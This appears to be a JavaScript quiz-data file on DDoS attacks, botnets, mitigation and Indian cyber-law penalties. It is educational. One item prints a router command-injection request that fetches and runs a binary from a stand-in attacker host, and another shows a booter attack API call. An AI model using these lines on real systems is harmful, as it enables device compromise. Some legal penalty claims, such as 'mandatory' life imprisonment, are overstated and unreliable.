const questions = [
  {
    question: "What is a Distributed Denial of Service (DDoS) attack, and how does it differ fundamentally from a single-source DoS attack?",
    shortAnswer: "A DDoS attack utilizes thousands or millions of geographically distributed compromised computers (botnets) simultaneously, generating massive aggregate traffic volumes that cannot be blocked by simple single-IP firewall blacklisting.",
    explanation: "In a single-source DoS attack, an attacker in Salt Lake is limited by their single internet uplink (e.g. 100 Mbps), and defenders can block that single source IP in seconds. In a Distributed Denial of Service (DDoS) attack, the attacker commands a global botnet of 500,000 compromised IoT devices, smart TVs, and cloud servers across 120 countries, generating 1.5 Terabits per second (Tbps) of simultaneous attack traffic.",
    hint: "One person shouting into a phone (DoS) vs 100,000 people calling the same phone number at the exact same second (DDoS).",
    level: "basic",
    codeExample: `// DoS vs DDoS Traffic Ingress:
// DoS  : [Attacker IP: 103.25.10.50] ➔ (100 Mbps) ➔ [Firewall: iptables -A INPUT -s 103.25.10.50 -j DROP] (BLOCKED!)
// DDoS : [500,000 Unique Global IPs] ➔ (1.5 Tbps) ➔ [Firewall State Table & Uplink Overwhelmed!] (COLLAPSE!)`
  },
  {
    question: "What is a 'Botnet', and what are 'Zombies' (Bots) and 'Botmasters' in DDoS Architecture?",
    shortAnswer: "A botnet is a network of compromised internet-connected devices (zombies) controlled remotely by an adversary (botmaster) through Command and Control (C2) infrastructure to execute synchronized attacks.",
    explanation: "A Botmaster uses automated malware scanning (e.g. Mirai, Mozi) to infect vulnerable routers, IP cameras, and servers with malware. Once infected, these devices become 'Zombies' (Bots). The zombies maintain a persistent connection to the Botmaster's Command and Control (C2) server. When the botmaster issues an attack command, all 100,000 zombies simultaneously flood the victim in Kolkata.",
    hint: "An army of hypnotized soldiers (zombies) taking orders from a hidden general (botmaster).",
    level: "basic",
    codeExample: `// Botnet Command & Control Hierarchy:
// [Botmaster] ➔ [C2 Server / Telegram Bot] ➔ [100,000 Zombie Bots] ➔ (Synchronized Flood) ➔ [Victim Server]`
  },
  {
    question: "What is the Difference between 'Centralized C2' and 'Peer-to-Peer (P2P) C2' Botnet Topologies?",
    shortAnswer: "Centralized C2 uses dedicated master servers (IRC/HTTP) with a single point of failure; P2P C2 distributes control across all infected bots using distributed hash tables (DHT), making the botnet resilient against takedowns.",
    explanation: "Early botnets used centralized IRC or HTTP servers. Law enforcement could neutralize the botnet by seizing the single C2 server. Modern botnets (e.g. Storm, GameOver Zeus, Mozi) use Peer-to-Peer (P2P) architectures based on Kademlia DHT. Every infected node acts as both a client and a relay. Shutting down 500 nodes has zero effect on the remaining 50,000 nodes.",
    hint: "A wheel with one central hub (Centralized) vs a spiderweb where cutting one thread leaves the rest intact (P2P).",
    level: "expert",
    codeExample: `// C2 Topologies:
// Centralized : [Bot 1, 2, 3...] ➔ [Central C2 Server (Seized by Police ➔ BOTNET DIES!)]
// P2P / DHT   : [Bot 1] ⇄ [Bot 2] ⇄ [Bot 3] (Decentralized ➔ No single point of failure!)`
  },
  {
    question: "How do 'Domain Generation Algorithms' (DGA) make Botnet Command & Control Resilient Against Static Domain Blacklisting?",
    shortAnswer: "The malware algorithmically generates hundreds of pseudo-random domain names daily (e.g. `x8k2m9z4.com`); the botmaster only needs to register 1 of those domains to control the botnet, rendering static blacklists useless.",
    explanation: "Instead of hardcoding a single C2 domain like `evil-c2.com` (which defenders block in DNS), DGA uses a seed (such as the current date): DGA(Date) -> 500 random domain names. The malware attempts to connect to all 500 domains daily. The attacker registers just 1 domain (`k9z3x7w1.in`) for that specific date. Defenders cannot pre-blacklist all possible algorithmic domains.",
    hint: "A spy who generates 500 secret code words each morning using today's date, and the handler only needs to use one of them.",
    level: "expert",
    codeExample: `// Python DGA Pseudocode:
import hashlib, time
def generate_dga_domains(seed_date):
    domains = []
    for i in range(10):
        h = hashlib.md5(f"{seed_date}_{i}".encode()).hexdigest()[:12]
        domains.append(f"{h}.in")
    return domains
# Generates: ['3a8f9c1e0d2b.in', '7b4e2f9a1c8d.in', ...]`
  },
  {
    question: "Under the Indian Information Technology Act 2000 Section 66F, what constitutes the criminal penalty for launching a DDoS attack against Critical National Infrastructure?",
    shortAnswer: "Launching a DDoS attack that threatens the unity, integrity, security or sovereignty of India or paralyzes critical infrastructure is CYBER TERRORISM, punishable with IMPRISONMENT FOR LIFE.",
    explanation: "Section 66F defines Cyber Terrorism. If an adversary uses a 100,000-node botnet to launch a distributed denial of service attack paralyzing the power grid in Barrackpore, the financial settlement network in Salt Lake, or railway signaling systems, the offense carries mandatory Life Imprisonment.",
    hint: "Section 66F prescribes Life Imprisonment for Cyber Terrorism DDoS attacks.",
    level: "basic",
    codeExample: `// Statutory Offense (IT Act Section 66F):
// Offense: Coordinating a 500 Gbps botnet DDoS attack against state power grid SCADA infrastructure
// Penalty: IMPRISONMENT FOR LIFE`
  },
  {
    question: "What is 'Fast-Flux DNS', and how do Botnets use Rapid TTL Expirations to Hide C2 Servers?",
    shortAnswer: "Constantly changing the IP addresses associated with a single C2 domain name in DNS every few minutes with ultra-short TTLs (e.g. 60 seconds), routing traffic through an ever-shifting pool of compromised proxy bots.",
    explanation: "In Single-Flux DNS, the `A` record for `attacker-c2.net` points to 50 different infected residential IP addresses, changing every 60 seconds. In Double-Flux DNS, both the `A` records and the Authoritative Name Server (`NS`) records flux continuously. When security researchers try to trace or block the C2 IP, the domain is already pointing to 50 completely new IP addresses in another country.",
    hint: "A criminal changing disguises and switching rental cars every 60 seconds to evade police tracking.",
    level: "expert",
    codeExample: `// Fast-Flux DNS Record Query (TTL = 60 Seconds):
// Minute 01: attacker-c2.net ➔ 185.220.101.5, 103.25.10.8, 198.51.100.4
// Minute 02: attacker-c2.net ➔ 45.33.32.156, 172.56.21.90, 82.102.23.4
// Result: Static firewall IP blocking is completely rendered useless!`
  },
  {
    question: "What is a 'Multi-Vector DDoS Attack', and why is it Significantly Harder to Mitigate than Single-Vector Floods?",
    shortAnswer: "An attack that simultaneously combines Volumetric (1 Tbps UDP), Protocol (50 Mpps SYN), and Application Layer (200k RPS HTTP) vectors, exhausting bandwidth, firewall state tables, and web application CPU concurrently.",
    explanation: "Adversaries launch multi-vector assaults to defeat layered defenses. If the enterprise uses a WAF to filter HTTP floods, the attacker simultaneously floods the upstream pipe with 500 Gbps of UDP traffic (pipe saturation) and sends 20 Mpps of TCP SYN packets (firewall state exhaustion). Mitigating multi-vector attacks requires hybrid defense: cloud scrubbing centers paired with on-premise WAFs.",
    hint: "Attacking a fortress by battering the main gate, tunneling under the walls, and setting fire to the roof all at the exact same minute.",
    level: "moderate",
    codeExample: `// Multi-Vector DDoS Profile:
// Vector 1 (Volumetric)  : 600 Gbps DNS Amplification ➔ Saturates Upstream Fiber Pipe
// Vector 2 (Protocol)    : 35 Million PPS SYN Flood   ➔ Fills Firewall Conntrack Tables
// Vector 3 (Application) : 150,000 RPS HTTP POST Flood➔ Locks Database CPU & RAM`
  },
  {
    question: "Under the Indian Information Technology Act 2000 Section 43(c) and (f), what constitutes Civil Liability for infecting devices into a Botnet and causing a Denial of Access?",
    shortAnswer: "Introducing contaminants (botnet malware) or causing denial of access carries liability to pay compensation by way of damages not exceeding ₹1 Crore per affected entity.",
    explanation: "Section 43 explicitly covers both malware infection and service denial: '(c) introduces or causes to be introduced any computer contaminant... (f) denies or causes the denial of access to any person authorized... he shall be liable to pay damages by way of compensation not exceeding one crore rupees.'",
    hint: "Section 43 provides civil damages up to ₹1 Crore for botnet infections and DoS disruptions.",
    level: "basic",
    codeExample: `// Statutory Liability (IT Act Section 43):
// Violation: Distributing Mirai malware variants to build botnets and flood online services
// Compensation: Up to ₹1,00,00,00,000 (Rupees One Crore) per affected entity`
  },
  {
    question: "What was the 'Mirai Botnet' (2016), and how did it exploit weaknesses in IoT security to generate large-scale DDoS attacks?",
    shortAnswer: "Mirai targeted vulnerable IoT devices protected by weak or default credentials and enrolled compromised devices into a large botnet that could be coordinated for DDoS activity.",
    explanation: "In October 2016, Mirai compromised large numbers of vulnerable IoT devices such as security cameras and DVRs. Devices with weak or default security configurations were particularly exposed. Compromised devices were enrolled into the botnet and later coordinated to participate in major DDoS attacks, including the attack against DNS provider Dyn. Specific credentials, scanning methods, and attack-launch procedures are omitted.",
    hint: "Think of many poorly secured smart devices being recruited into one remotely coordinated network.",
    level: "moderate",
    codeExample: `// Mirai Botnet — Safe Conceptual Flow:
      1. Identify vulnerable IoT devices
      2. Detect weak or default security configurations
      3. Compromise vulnerable devices
      4. Enroll compromised devices into a botnet
      5. Coordinate defensive analysis and simulation
      // Credential lists, scanning logic, and attack procedures are omitted.`
  },
  {
    question: "What is 'Anycast BGP Routing', and how does it Distribute Volumetric DDoS Traffic across Global Scrubbing Centers?",
    shortAnswer: "Advertising the exact same IP address from multiple geographically distributed data centers using BGP; Internet routing automatically directs attack traffic to the closest local scrubbing center, diluting the flood globally.",
    explanation: "In Unicast routing, all traffic for `103.25.10.50` travels to a single physical server in Kolkata, which collapses under a 500 Gbps flood. With Anycast BGP routing, Cloudflare or Akamai advertises `103.25.10.50` from 300 data centers worldwide. Attack traffic from European bots is routed to Frankfurt, Asian bots to Singapore, and US bots to Ashburn. The 500 Gbps attack is diluted into manageable 1.5 Gbps chunks at each local node.",
    hint: "Having 300 emergency fire stations around the city instead of forcing every fire truck in the world to drive to one single station.",
    level: "expert",
    codeExample: `// BGP Anycast DDoS Traffic Dilution:
// Total Global DDoS Flood = 600 Gbps across 300 Anycast PoPs
// PoP Frankfurt : Absorbs 2.1 Gbps local attack traffic
// PoP Singapore : Absorbs 1.8 Gbps local attack traffic
// PoP Ashburn   : Absorbs 2.4 Gbps local attack traffic
// Result        : Clean filtered traffic forwarded to Kolkata Origin Server (0% Overload!)`
  },
  {
    question: "Under the Digital Personal Data Protection (DPDP) Act 2023 Section 8(5) and Section 33, what are the enterprise obligations for maintaining service availability during DDoS attacks?",
    shortAnswer: "Organizations must implement reasonable technical availability and resilience safeguards; persistent failure to maintain availability of citizen personal data services triggers statutory fines up to ₹250 Crores.",
    explanation: "Section 8(5) mandates that data fiduciaries must implement reasonable technical and organizational safeguards against disruptions. If a major public utility or hospital network in West Bengal fails to deploy DDoS scrubbing or Anycast resilience, resulting in prolonged data access failure for citizens, the DPBI can impose penalties up to ₹250 Crores under Section 33.",
    hint: "Maintaining continuous service availability is a mandatory technical safeguard under the DPDP Act.",
    level: "moderate",
    codeExample: `// DPDP Statutory Compliance Standard:
// Legal Section: Section 8(5) & Section 33 DPDP Act 2023
// Maximum Penalty: Up to ₹250,00,00,000 (Rupees 250 Crores) for negligent DDoS availability safeguards`
  },
  {
    question: "What is 'BGP Flowspec' (RFC 5575), and how does it enable Rapid Upstream DDoS Traffic Filtering at the ISP Level?",
    shortAnswer: "A BGP protocol extension allowing enterprise border routers to automatically inject granular firewall filtering rules (e.g. drop UDP packets on port 53 exceeding 1000 bytes) directly into upstream Tier-1 ISP core routers.",
    explanation: "Traditional BGP blackholing drops 100% of traffic to a victim IP (taking the server offline). BGP Flowspec allows granular policy propagation: an enterprise in Kolkata signals its upstream ISP (Airtel, Tata) to drop ONLY the malicious attack signature: `Match: Dest IP 103.25.10.50, Protocol UDP, Packet Length > 1400 ➔ Action: Rate-Limit 0`. Malicious traffic is scrubbed at the ISP core, while legitimate HTTP web traffic flows cleanly.",
    hint: "Telling the water company to filter out mud at the main water plant instead of having mud clog your home's water pipes.",
    level: "expert",
    codeExample: `// BGP Flowspec Filtering Rule (RFC 5575):
flow-route {
    match {
        destination 103.25.10.50/32;
        protocol udp;
        destination-port 53;
        packet-length 1400-1500;
    }
    then {
        rate-limit 0; # Drops malicious amplification packets at ISP Core!
    }
}`
  },
  {
    question: "Under CERT-In Mandatory Directions 2022, what is the mandatory incident reporting timeline for Distributed Denial of Service (DDoS) attacks?",
    shortAnswer: "All organizations in India must report DDoS attacks affecting critical operations, public services, or data centers to CERT-In within 6 HOURS of detection.",
    explanation: "Under Section 70B of the IT Act and CERT-In Direction No. 20(3)/2022-CERT-In, service providers, intermediaries, data centers, and corporate bodies must mandatorily report specified cyber security incidents (including distributed denial of service attacks) to CERT-In within 6 hours of noticing them.",
    hint: "CERT-In requires mandatory incident reporting within a strict 6-hour window.",
    level: "basic",
    codeExample: `// Statutory SLA (CERT-In Mandatory Incident Reporting):
// Directive: Mandatory reporting of distributed denial of service outages within 6 HOURS
// Mandate: Section 70B Information Technology Act 2000`
  },
  {
    question: "What are 'DDoS-for-Hire Services' (Booters / Stressers), and how do they Lower the Technical Barrier for Cyber Extortion?",
    shortAnswer: "Commercial web portals operating multi-terabit botnets that allow non-technical criminals to launch massive multi-vector DDoS attacks for as little as ₹500 to ₹5,000 per hour via cryptocurrency.",
    explanation: "Booter/Stresser platforms package complex botnets, reflection amplifiers, and L7 HTTP bypass tools into simple web dashboards with API access. A criminal in Kolkata with zero coding knowledge registers on a booter site, enters a victim IP, selects '100 Gbps UDP Bypass', and clicks 'Launch Attack' using cryptocurrency payments, democratizing destructive cyber warfare.",
    hint: "Renting a massive wrecking ball with a credit card to smash a building with one click.",
    level: "basic",
    codeExample: `// Booter / Stresser API Attack Request:
POST https://stresser-attacker-c2.net/api/v1/attack
{
    "target": "103.25.10.50",
    "port": 443,
    "duration_seconds": 3600,
    "method": "CLOUDFLARE_BYPASS_UAM",
    "threads": 500
}`
  },
  {
    question: "How do 'Cloud DDoS Scrubbing Centers' Cleanse Multi-Terabit Ingress Traffic?",
    shortAnswer: "By diverting incoming traffic via BGP Anycast or DNS redirection through high-capacity scrubbing centers that inspect packets in hardware (FPGA/ASIC), dropping malicious packets and forwarding only clean traffic to the origin via GRE/IPsec tunnels.",
    explanation: "When a 1 Tbps DDoS attack begins, the enterprise redirects its DNS or BGP routes to a cloud scrubbing provider (Akamai, Cloudflare, AWS Shield). The provider's global network absorbs the 1 Tbps flood. Proprietary scrubbing filters inspect packet headers and behavioral signatures, dropping attack traffic in hardware within microseconds. Clean legitimate traffic is tunneled across a private GRE/IPsec connection directly to the origin server in Kolkata.",
    hint: "A giant water filtration plant that purifies millions of gallons of muddy river water and sends crystal clear water to your home tap.",
    level: "expert",
    codeExample: `// Cloud Scrubbing Architecture:
// [1.2 Tbps Inbound Flood] ➔ [Global Scrubbing Center (ASIC/FPGA Deep Inspection)]
// Malicious UDP/SYN Floods : DROPPED in Hardware (1.19 Tbps filtered!)
// Clean Legitimate Traffic  : Forwarded via Encrypted GRE Tunnel (10 Gbps) ➔ [Origin Server in Kolkata]`
  },
  {
    question: "Under the Indian Penal Code Section 427 and Section 420, what constitutes criminal penalties for DDoS Extortion (Ransom DDoS)?",
    shortAnswer: "Demanding extortion ransoms under threat of launching or continuing destructive DDoS attacks carries imprisonment up to 7 years and fines.",
    explanation: "Section 420 (Cheating and Dishonestly Inducing Delivery of Property) and Section 427 (Mischief) penalize Ransom DDoS attacks. Threat actor groups (e.g. Fancy Lazarus) that email corporate executives in Salt Lake demanding ₹50 Lakhs in Bitcoin to halt a 300 Gbps DDoS attack are prosecuted under Section 420 and Section 427 alongside IT Act Section 66.",
    hint: "IPC Section 420 and 427 cover Cheating, Mischief, and Ransom Extortion with up to 7 years prison.",
    level: "basic",
    codeExample: `// Statutory Offense (Indian Penal Code Section 420):
// Offense: Threatening a Kolkata FinTech firm with 500 Gbps DDoS floods unless ₹50 Lakhs ransom is paid
// Penalty: Imprisonment for a term up to 7 Years, and shall also be liable to Fine`
  },
  {
    question: "What is 'Direct-to-Origin DDoS Bypassing', and how do Attackers find Origin Server IP Addresses hidden behind Cloud Proxies?",
    shortAnswer: "Discovering the true, unproxied backend IP address of a web server (via historical DNS records, SSL certificate search engines like Censys/Shodan, or outbound email headers) to attack the server directly, bypassing Cloudflare/WAF protections.",
    explanation: "If a company in Kolkata protects `kolkata-fintech.in` behind Cloudflare but sends outbound password reset emails directly from its backend origin IP (`103.25.10.50`), the origin IP is revealed in email headers (`Received:`). Attackers bypass Cloudflare entirely, sending a 100 Gbps flood directly to `103.25.10.50`. Defense requires strict firewall rules allowing inbound traffic ONLY from Cloudflare IP ranges.",
    hint: "Hiding your house behind a security gate, but giving your real home address on outgoing mail so the burglar drives straight to your backyard.",
    level: "expert",
    codeExample: `// Origin Firewall Lockdown Rule (iptables):
# Drop all direct HTTP/HTTPS traffic unless originating from Cloudflare IP Ranges!
iptables -A INPUT -p tcp -m multiport --dports 80,443 -s 173.245.48.0/20 -j ACCEPT
iptables -A INPUT -p tcp -m multiport --dports 80,443 -s 103.21.244.0/22 -j ACCEPT
iptables -A INPUT -p tcp -m multiport --dports 80,443 -j DROP # Drops direct-to-origin bypass floods!`
  },
  {
    question: "Synthesize an enterprise-scale Distributed Denial of Service (DDoS) Defense Architecture.",
    shortAnswer: "A multi-layered system combining Cloud Anycast Scrubbing Centers, Upstream BGP Flowspec Rate Limiting, Origin Firewall Whitelisting, Stateful Firewall Conntrack Scaling, and Next-Gen WAF Behavioral Challenge Engines.",
    explanation: "To achieve complete immunity against multi-terabit distributed attacks: 1. Cloud Tier: Global Anycast Scrubbing network (absorbing 10+ Tbps volumetric and DNS reflection floods). 2. Routing Tier: BGP Flowspec rules filtering protocol anomalies at upstream Tier-1 ISPs. 3. Perimeter Tier: Origin firewall restricting ingress ports 80/443 exclusively to verified scrubbing CIDRs. 4. Kernel Tier: Hardened Linux TCP stack with SYN Cookies and 2M conntrack table entries. 5. Application Tier: Web Application Firewall (WAF) issuing JavaScript cryptographic challenges (Cloudflare UAM) to filter Layer 7 botnet HTTP floods.",
    hint: "Combine cloud Anycast scrubbing, BGP Flowspec upstream filters, origin firewall lockdowns, kernel SYN cookies, and WAF JS challenges.",
    level: "expert",
    codeExample: `// Master DDoS Defense Blueprint:
// 1. Cloud Tier    : Global Anycast Scrubbing Center absorbing 10+ Tbps Volumetric & Reflection Floods
// 2. Upstream Tier : BGP Flowspec (RFC 5575) dropping packet anomalies at ISP Core
// 3. Origin Tier   : Ingress Firewall dropping all direct non-scrubbed traffic
// 4. Host OS Tier  : Linux Kernel Tuning (tcp_syncookies=1, nf_conntrack_max=2000000)
// 5. App Layer     : WAF Behavioral Bot Management with JavaScript Cryptographic Challenges`
  },
  {
    question: "What is 'JavaScript Cryptographic Challenge-Response' (Under Attack Mode) in Layer 7 DDoS Mitigation?",
    shortAnswer: "Serving an intermediate interstitial HTML page requiring the client's browser to solve a complex JavaScript mathematical puzzle (e.g. SHA-256 proof-of-work) within 5 seconds before granting access to the web server.",
    explanation: "Layer 7 HTTP floods use automated scripts (`curl`, Python requests, headless bots) that cannot execute full JavaScript engines. When Under Attack Mode is enabled, the edge proxy responds to incoming requests with a 5-second JS challenge page. Legitimate web browsers (Chrome, Firefox) solve the puzzle automatically and receive a clearance cookie; simple automated botnet scripts fail the challenge and are dropped.",
    hint: "A computational bouncer that asks every visitor to solve a complex math puzzle in their head before letting them through the door.",
    level: "moderate",
    codeExample: `// JavaScript Proof-of-Work Challenge Concept:
// Server sends challenge : Find nonce 'N' such that SHA256("kolkata-salt-" + N) begins with "0000"
// Browser computes       : Iterates 65,000 hashes in 200ms ➔ Submits valid nonce ➔ Access Granted!
// Dumb Python Bot Script : Fails to execute JavaScript ➔ BLOCKED WITH HTTP 403!`
  },
  {
    question: "How do 'IoT Botnets' (like Mozi and Reaper) Exploit Zero-Day Vulnerabilities in Consumer Routers for Rapid Infection Propagation?",
    shortAnswer: "By embedding automated exploit chains targeting known remote code execution (RCE) flaws and unauthenticated command injection vulnerabilities in router web management interfaces across multiple hardware vendors.",
    explanation: "Unlike Mirai (which only brute-forced default passwords), advanced IoT botnets like Mozi incorporate 10-15 CVE exploits (e.g. D-Link, Netgear, Huawei command injection vulnerabilities). The malware autonomously scans the internet: when it finds a vulnerable router, it executes an RCE payload that downloads the bot binary, kills competing malware processes, and turns the router into an active botnet node.",
    hint: "A virus that not only tries unlocked doors, but carries 15 specialized lockpicks to break into 15 different brands of locks.",
    level: "expert",
    codeExample: `// IoT Router Command Injection Exploit String:
POST /setup.cgi?next_file=netcore_get.ccp HTTP/1.1
Host: 103.25.10.50
Content-Type: application/x-www-form-urlencoded

cmd=wget http://attacker-c2.net/bot.arm -O /tmp/b && chmod +x /tmp/b && /tmp/b
# Result: Router infected and converted into active botnet zombie in 2 seconds!`
  },
  {
    question: "Under the Indian IT Act Section 66, what constitutes the criminal penalty for operating Command and Control (C2) servers to coordinate DDoS attacks?",
    shortAnswer: "Operating botnet C2 servers or writing botnet malware to disrupt computer systems carries imprisonment up to 3 years and fines up to ₹5 Lakhs.",
    explanation: "Section 66 criminalizes fraudulent and unauthorized computer operation. Developing botnet malware, renting C2 servers, or launching attacks from botnet infrastructure in West Bengal is prosecuted under Section 66.",
    hint: "Section 66 provides up to 3 years imprisonment and ₹5 Lakh fine for operating botnet C2 infrastructure.",
    level: "basic",
    codeExample: `// Statutory Penalty (IT Act Section 66):
// Offense: Operating a botnet Command & Control server in Kolkata to launch DDoS attacks
// Penalty: Up to 3 Years Imprisonment + Fine up to ₹5,00,000`
  },
  {
    question: "What is 'DDoS Extortion' (Ransom DDoS / RDoS), and how do Threat Actors Prove their Threat Capability?",
    shortAnswer: "Threat actors send an extortion note demanding cryptocurrency, accompanied by a short 'demonstration attack' (e.g. a 50 Gbps flood for 15 minutes) to prove they possess the capacity to take down the business.",
    explanation: "In an RDoS campaign, an e-commerce or gaming company in Kolkata receives an email: 'Pay 2 Bitcoin by Friday or we will launch a 500 Gbps flood during your peak holiday sales.' To prove the threat is real, the attackers launch a 15-minute demonstration flood that takes down the website immediately, coercing non-technical management into panic.",
    hint: "Shooting a warning flare over a ship to show you have live cannons before demanding surrender.",
    level: "moderate",
    codeExample: `// Sample Ransom DDoS (RDoS) Threat Note:
"Subject: DDoS Attack Warning for kolkata-fintech.in
To the Board of Directors:
We have scheduled a 500 Gbps DDoS attack against your network for tomorrow at 10 AM.
To prove our capability, your website will go down for exactly 15 minutes starting NOW.
Send 2 BTC to [Wallet Address] to cancel the attack."`
  },
  {
    question: "What is 'IP Spoofing' in UDP-Based DDoS Attacks, and why does RFC 2827 / BCP 38 Ingress Filtering Stop It?",
    shortAnswer: "Forging the Source IP address in packet headers; BCP 38 ingress filtering stops this by having ISPs check whether the Source IP of outbound packets belongs to the customer's allocated subnet, dropping forged packets at the source.",
    explanation: "In UDP reflection attacks, attackers forge the victim's IP in the source field. If every Internet Service Provider enforced BCP 38 (Network Ingress Filtering), an ISP in Kolkata would inspect all outbound packets from customer subnets. If a packet has `Source IP: 103.25.10.50` but originates from a home broadband connection allocated `182.70.0.0/16`, the router drops the packet immediately, preventing spoofed reflection floods worldwide.",
    hint: "A post office that checks your return address on outgoing mail and refuses to send any letter where the return address is not your real home.",
    level: "expert",
    codeExample: `// BCP 38 Ingress Filtering Router Configuration (Cisco):
interface GigabitEthernet0/1
 ip verify unicast source reachable-via rx
// Result: Drops any outbound packet whose Source IP does not route back to that interface (Unicast RPF)!`
  },
  {
    question: "Under the Indian IT Act Section 70, what constitutes the penalty for launching a DDoS attack against designated 'Protected Systems' (Critical Information Infrastructure)?",
    shortAnswer: "Securing unauthorized access or attempting to deny access to designated Protected Systems carries imprisonment up to 10 YEARS and severe fines.",
    explanation: "Section 70 of the IT Act governs Critical Information Infrastructure (e.g. power grids in Barrackpore, financial settlement switches in Salt Lake). Launching a DDoS attack that denies access to a designated protected system carries up to 10 years imprisonment under Section 70.",
    hint: "Section 70 carries up to 10 years imprisonment for DDoS attacks on Protected Systems.",
    level: "basic",
    codeExample: `// Statutory Offense (IT Act Section 70):
// Offense: Coordinating a botnet flood targeting critical state electric utility SCADA networks
// Penalty: Imprisonment for a term up to 10 YEARS, and shall also be liable to Fine`
  },
  {
    question: "What is 'Hit-and-Run / Pulse Wave DDoS', and how does it Defeat Legacy Cloud Scrubbing Auto-Scaling?",
    shortAnswer: "Launching short, massive bursts of attack traffic (e.g. 500 Gbps for 60 seconds), stopping for 5 minutes, and repeating; legacy cloud scrubbers take 2-3 minutes to auto-route traffic, meaning the attack finishes before defense kicks in.",
    explanation: "Traditional cloud mitigation activates via BGP route changes when traffic exceeds a threshold, taking 120-180 seconds to reroute traffic through scrubbing centers. Pulse Wave attacks strike with 600 Gbps for 45 seconds, crushing the origin server, and then abruptly stop. Just as the scrubber prepares to engage, traffic returns to zero. The attacker pulses repeatedly, keeping the server constantly offline without sustaining long continuous traffic.",
    hint: "A boxer who throws a knockout punch in 2 seconds and steps back before the referee can count, repeating every few minutes.",
    level: "expert",
    codeExample: `// Pulse Wave DDoS Timing Pattern:
// 00:00 - 00:45 : Ingress 600 Gbps Spike ➔ Origin Server Crashes!
// 00:45 - 03:00 : Traffic = 0 Gbps (Scrubbing Auto-Scaler resets)
// 03:00 - 03:45 : Ingress 600 Gbps Spike ➔ Origin Crashes Again!
// Mitigation    : Always-On Cloud Proxy (Zero BGP route convergence delay!)`
  },
  {
    question: "How do 'Layer 7 HTTP Floods' Bypass Simple IP Rate Limiting via User-Agent and Cookie Rotation?",
    shortAnswer: "By simulating realistic web browsers with randomized User-Agent strings, rotating HTTP headers, and using vast residential proxy networks that route every HTTP request through a different residential IP address.",
    explanation: "Simple rate limiting blocks an IP that makes $> 20$ requests/sec. Advanced Layer 7 botnets route requests through 100,000 residential proxy IPs (compromised home Wi-Fi connections). Each residential IP sends only 1 HTTP request every 2 minutes with valid browser headers (`User-Agent: Mozilla/5.0...`). To the web server, it looks like 100,000 legitimate human visitors, bypassing static IP rate limits.",
    hint: "Hiring 100,000 different people to each walk into a store and ask for 1 glass of water instead of 1 person asking for 100,000 glasses.",
    level: "expert",
    codeExample: `// Residential Proxy Layer 7 HTTP Flood Header Rotation:
// Request 1 from IP 182.70.10.5  : GET /search?q=pan User-Agent: Chrome/128.0 (1 req/min)
// Request 2 from IP 103.25.10.82 : GET /search?q=aadhaar User-Agent: Firefox/130.0 (1 req/min)
// Mitigation: Behavioral Proof-of-Work Challenges & Web Application Firewalls!`
  },
  {
    question: "Under the Indian Penal Code Section 426, what constitutes the definition and punishment for Mischief via DDoS service disruption?",
    shortAnswer: "Intentionally destroying or diminishing the utility of computer systems or online services carries imprisonment up to 3 months, or fine, or both.",
    explanation: "Section 425/426 IPC defines Mischief. Launching a botnet attack that temporarily disables an online service in West Bengal constitutes electronic mischief under Section 426 IPC alongside IT Act cyber provisions.",
    hint: "IPC Section 426 covers Mischief and basic property disruption.",
    level: "basic",
    codeExample: `// Statutory Penalty (Indian Penal Code Section 426):
// Offense: Intentionally disrupting public municipal web portals via botnet attacks
// Penalty: Imprisonment for a term up to 3 Months, or with Fine, or with both`
  },
  {
    question: "What is 'Asymmetrical Resource Consumption' in DDoS Economics?",
    shortAnswer: "The economic disparity where an attacker spends a few dollars to rent a botnet that inflicts millions of dollars in downtime, lost revenue, and infrastructure defense costs on the victim.",
    explanation: "An attacker spends ₹1,000 to launch a 300 Gbps flood for 2 hours using a commercial stresser service. The targeted FinTech enterprise in Kolkata suffers ₹2.5 Crores in lost payment transactions, spends ₹50 Lakhs in emergency cloud scrubbing bandwidth surcharges, and suffers severe brand damage, representing an extreme 1:100,000 economic asymmetry.",
    hint: "Spending ₹10 on a match to burn down a ₹100 Crore skyscraper.",
    level: "moderate",
    codeExample: `// DDoS Economic Asymmetry:
// Attacker Cost   : ₹1,500 (1-Hour Booter Subscription)
// Victim Losses   : ₹3,50,00,000 (Transactional Downtime + Cloud Scrubbing Surcharges)
// Economic Ratio  : 1 : 23,333 Disparity!`
  },
  {
    question: "Synthesize the mathematical relationship between Aggregated Botnet Flood Bandwidth (B_total = ∑ B_i), Cloud Scrubbing Capacity (C_scrubbing), Jitter / Noise Variance (σ_jitter), and Link Saturation / Service Failure Probability (P_saturation).",
    shortAnswer: "Link saturation probability is modeled as P_saturation = 1 - e^(- max(0, B_total - C_scrubbing) / σ_jitter); deploying multi-terabit Anycast cloud scrubbing networks (C_scrubbing > B_total) drives service failure probability to zero.",
    explanation: "Let B_total = ∑ B_i represent the aggregate bandwidth generated by N botnet nodes (e.g. 500,000 nodes generating 1.2 Tbps), C_scrubbing represent the cloud scrubbing capacity (e.g. 10 Tbps Anycast global network), and σ_jitter represent traffic burstiness. When attack bandwidth exceeds scrubbing capacity (B_total > C_scrubbing), saturation probability is: P_saturation = 1 - e^(-(B_total - C_scrubbing) / σ_jitter). When organizations deploy global Anycast scrubbing where C_scrubbing >> B_total, saturation probability collapses to zero (P_saturation -> 0).",
    hint: "Mathematical formula proving that when cloud scrubbing capacity exceeds total botnet attack bandwidth (C_scrubbing > B_total), link saturation probability is zero.",
    level: "expert",
    codeExample: `// Botnet Aggregation & Scrubbing Capacity Mathematical Proof:
// Attack Traffic (B_total) = 1.2 Tbps | Enterprise Uplink = 10 Gbps (Without Cloud Scrubbing)
// Without Scrubbing ➔ P_saturation = 1 - e^(- (1200 - 10) / 10) = 100.0% (NETWORK CRUSHED!)
// With Cloud Anycast (C_scrubbing = 10 Tbps) ➔ Surplus Capacity = +8.8 Tbps ➔ P_saturation = 0.0% (IMMUNE!)`
  }
];

export default questions;
